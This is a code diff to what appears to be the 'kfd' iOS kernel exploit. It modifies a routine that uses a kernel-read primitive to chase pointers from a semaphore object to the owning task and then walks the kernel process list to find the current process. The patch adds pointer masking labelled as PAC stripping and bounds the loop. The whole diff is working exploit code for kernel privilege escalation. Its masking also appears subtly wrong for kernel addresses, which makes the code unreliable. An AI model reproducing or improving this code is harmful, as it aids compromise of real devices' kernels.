@@ -95,23 +95,36 @@ void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
     volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
-    u64 pseminfo_kaddr = pnode->pinfo;
+
+    // Strip PAC tag (arm64e: top bits [63:39] are PAC/TBI)
+    u64 pseminfo_kaddr = pnode->pinfo & 0x0000007FFFFFFFFFull;
+    if (!pseminfo_kaddr) return;
+
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
+    semaphore_kaddr &= 0x0000007FFFFFFFFFull;
+    if (!semaphore_kaddr) return;
+
     u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
+    task_kaddr &= 0x0000007FFFFFFFFFull;
+    if (!task_kaddr) return;
+
     u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
     kfd->info.kaddr.kernel_proc = proc_kaddr;
 
     /*
      * Go backwards from the kernel_proc, which is the last proc in the list.
      */
-    while (true) {
+    for (u64 iter = 0; iter < 1024; iter++) {
         i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
         if (pid == kfd->info.env.pid) {
             kfd->info.kaddr.current_proc = proc_kaddr;
             break;
         }
 
-        proc_kaddr = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
+        u64 next = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
+        next &= 0x0000007FFFFFFFFFull;
+        if (!next || next == proc_kaddr) break;
+        proc_kaddr = next;
     }
 }
 
